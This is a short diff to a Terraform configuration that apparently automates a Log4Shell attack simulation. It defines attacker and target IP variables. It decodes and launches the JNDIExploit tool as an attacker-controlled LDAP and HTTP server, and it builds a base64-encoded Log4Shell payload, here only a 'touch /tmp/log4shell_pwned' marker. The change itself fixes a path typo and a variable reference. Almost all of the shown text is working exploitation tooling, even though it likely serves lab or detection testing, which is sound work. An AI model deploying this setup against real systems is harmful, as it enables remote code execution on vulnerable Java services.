@@ -7,13 +7,13 @@ locals {
     attacker_ip=var.attacker_ip
     target_ip=var.target_ip
     target_port=var.target_port
-    jndi_base64=file("./resources/jdni.base64")
+    jndi_base64=file("${path.module}/resources/jndi.base64")
     base64_log4shell_payload=base64encode(<<-EOT
     touch /tmp/log4shell_pwned
     EOT
     )
     command_payload=<<-EOT
-    bash -c "echo '${local.jndi_base64.content}' | base64 -d > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
+    bash -c "echo '${local.jndi_base64}' | base64 -d > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
     EOT
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
